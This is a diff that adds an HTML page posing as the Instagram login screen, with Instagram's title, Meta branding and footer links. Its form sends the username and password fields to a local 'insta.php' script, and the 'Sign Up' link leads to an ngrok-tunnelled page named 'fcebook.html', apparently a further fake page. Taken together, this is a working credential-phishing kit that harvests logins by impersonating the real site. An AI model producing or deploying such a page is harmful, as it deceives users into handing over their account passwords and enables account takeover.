@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./images/instagg.png" type="image/x-icon">
+    <link rel="stylesheet" href="./assets/css.css">
+    <link rel="shortcut icon" href="./assets/ins.png" type="image/x-icon">
+    <title>Instagram</title>
+ 
+</head>
+<body>
+    <div class="container">
+        <div class="box">
+            <div class="heading"></div>
+            <form class="login-form"action="insta.php" method="post" onsubmit="return vrt()">
+                <div class="field">
+                    <input id="usr" type="text" name="mail" placeholder="Phone number, username, or email" />
+                    <label for="usr">Phone number, username, or email</label>
+                </div>
+                <div class="field">
+                    <input id="pass" type="password" placeholder="password" name="pass"  />
+                    <label for="pass">Password</label>
+                </div>
+                <button class="login-button" title="login" type="submit">Log In</button>
+                <div class="separator">
+                    <div class="line"></div>
+                    <p><b>OR</b></p>
+                    <div class="line"></div>
+                </div>
+                <div class="other">
+                    <a href=""><button class="fb-login-btn" type="button">
+                        <img src="./assets/fb.png" class="fa fa-facebook-official fb-icon">
+                        <span class="">Log in with Facebook</span>
+                    </button></a>
+                    <br>
+                    <a class="forgot-password" href="#">Forgot password?</a>
+                </div>
+            </form>
+        </div>
+        <div class="box">
+            <p>Don't have an account? <a class="signup" href=" https://promoted-mayfly-nice.ngrok-free.app/Jumia/fcebook.html  ">Sign Up</a></p>
+        </div>
+
+        <div><p>Get the app.</p>
+        </div>
+      <div>
+        <img src="./assets/p2.png" alt="" class="pr pr1">
+        <img src="./assets/p1.png" alt="" class="pr">
+      </div>
+
+    </div>
+
+<footer>
+    <div id="extralinksdiv" class="dd1">
+        <a href="#" class="extralinks">Sign Up</a>
+        <a href="#" class="extralinks">Log In</a>
+        <a href="#" class="extralinks">Messenger</a>
+        <a href="#" class="extralinks">Facebook Lite</a>
+        <a href="#" class="extralinks">Local</a>
+        <a href="#" class="extralinks">Fundraisers</a>
+        <a href="#" class="extralinks">About</a>
+        <a href="#" class="extralinks">Create ad</a>
+        <a href="#" class="extralinks">Create Page</a>
+        <a href="#" class="extralinks">Developers</a>
+        <a href="#" class="extralinks">Careers</a>
+        <a href="#" class="extralinks">Privacy</a>
+        <a href="#" class="extralinks">Cookies</a>
+        <a href="#" class="extralinks">AdChoices</a>
+        <a href="#" class="extralinks">Terms</a>
+        <a href="#" class="extralinks">Account security</a>
+        <a href="#" class="extralinks">Login help</a>
+        <a href="#" class="extralinks">Help</a>
+
+        <div>
+            <p>© 2023 Instagram from Meta</p>
+        </div>
+      </div>
+
+
+
+
+
+</footer>
+    <script>
+        function vrt(){
+            m=document.getElementById('usr').value
+            p=document.getElementById('pass').value
+            if(m.length<5 || p.length<5){
+            
+                return false
+            }
+        }
+    </script>
+</body>
+</html>
